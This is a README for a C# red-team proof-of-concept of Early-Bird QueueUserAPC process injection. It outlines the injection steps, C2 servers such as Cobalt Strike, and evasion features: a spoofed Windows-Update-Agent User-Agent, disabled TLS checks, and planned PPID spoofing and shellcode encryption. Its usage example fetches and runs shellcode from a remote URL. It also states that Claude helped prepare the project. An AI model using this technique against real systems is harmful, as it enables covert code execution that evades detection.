# QueuserAPC

A C# proof-of-concept demonstrating the **Early-Bird QueueUserAPC** process injection technique on Windows.

> **Authorised use only.** This tool is provided for educational purposes and authorised red team / penetration testing engagements. Do not execute against systems you do not own or have explicit written permission to test.

---

## Technique Overview

Early-Bird QueueUserAPC is a shellcode injection method that abuses the Windows APC (Asynchronous Procedure Call) dispatch mechanism:

1. A sacrificial process (`win32calc.exe`) is spawned in a **suspended** state via `CreateProcessW` with `CREATE_SUSPENDED`.
2. Shellcode is fetched from a remote staging server.
3. Memory is allocated in the target process (`VirtualAllocEx`), written (`WriteProcessMemory`), and marked executable (`VirtualProtectEx`).
4. An APC is queued to the primary thread pointing at the shellcode (`QueueUserAPC`).
5. The thread is resumed (`ResumeThread`); the APC fires before any user code runs.

This approach avoids classic `CreateRemoteThread` detection heuristics because execution is triggered through the legitimate APC dispatch path.

---

## Requirements

| Requirement | Version |
|---|---|
| .NET SDK | 8.0+ |
| OS | Windows (Win32 P/Invoke) |
| Shellcode server | Any HTTP/S listener (e.g. Cobalt Strike, Havoc, sliver) |

---

## Build

```bash
dotnet build -c Release
```

Output: `QueuserAPC\bin\Release\net8.0\QueuserAPC.exe`

---

## Usage

```
QueuserAPC.exe <shellcode-url>
```

| Argument | Description |
|---|---|
| `<shellcode-url>` | URL serving raw shellcode bytes (HTTP or HTTPS) |

**Example:**

```
QueuserAPC.exe https://192.168.1.10/payload.bin
```

> The HTTP client sends a `Windows-Update-Agent` User-Agent string and skips TLS certificate validation — suitable for lab environments using self-signed certificates.

---

## Project Structure

```
QueuserAPC/
├── QueuserAPC/
│   ├── Program.cs          # Entry point — injection logic
│   └── Win32.cs            # P/Invoke declarations and enums
├── .editorconfig           # C# formatting and naming conventions
├── .gitignore
├── .pre-commit-config.yaml # Pre-commit hooks (gitleaks, dotnet format)
└── QueuserAPC.sln
```

---

## Development

### Pre-commit hooks

Install [pre-commit](https://pre-commit.com/) and [gitleaks](https://github.com/gitleaks/gitleaks), then:

```bash
pre-commit install
```

Hooks run automatically on `git commit`:

| Hook | Purpose |
|---|---|
| **gitleaks** | Detects secrets and credentials before they enter history |
| **dotnet format** | Enforces `.editorconfig` conventions |
| **trailing-whitespace** | Strips trailing whitespace |
| **end-of-file-fixer** | Ensures files end with a newline |

---

## Roadmap

| # | Status | Description |
|---|---|---|
| 1 | ✅ Done | Secret sanitisation — removed hardcoded internal IP; URL is now a CLI argument |
| 2 | ✅ Done | Upgraded target framework from EOL `net7.0` to LTS `net8.0` |
| 3 | ✅ Done | Code quality pass — removed comment noise, applied karpathy surgical-change principles |
| 4 | ✅ Done | Tooling — `.editorconfig`, `.pre-commit-config.yaml` with gitleaks and dotnet format |
| 5 | ⬜ Planned | Add process argument spoofing via `UpdateProcThreadAttribute` (PPID spoofing) |
| 6 | ⬜ Planned | Add optional XOR/RC4 shellcode decryption stage |
| 7 | ✅ Done | CI workflow (GitHub Actions) — secret scan + build + format check on push |
| 8 | ✅ Done | xUnit test project — CLI argument validation and URL guard (Win32 calls are integration-level and excluded) |

---

## References

- [CRTO — Certified Red Team Operator, Zero-Point Security](https://training.zeropointsecurity.co.uk/courses/red-team-ops)
- [Microsoft Docs — QueueUserAPC](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc)
- [Elastic — APC Injection](https://www.elastic.co/blog/ten-process-injection-techniques-technical-survey-common-and-trending-process)

---

## Note on AI Assistance

This project was prepared for publication with heavy assistance from [Claude](https://claude.ai) (Anthropic). The tooling, documentation, and refactoring should be correct, but some elements — particularly the CI workflow and pre-commit configuration — have not been fully verified end-to-end in a live environment. If you run into issues, PRs and fixes are very welcome.

---

## Disclaimer

This project is intended strictly for **educational purposes** and use within **authorised red team engagements or lab environments**. The author accepts no liability for misuse.
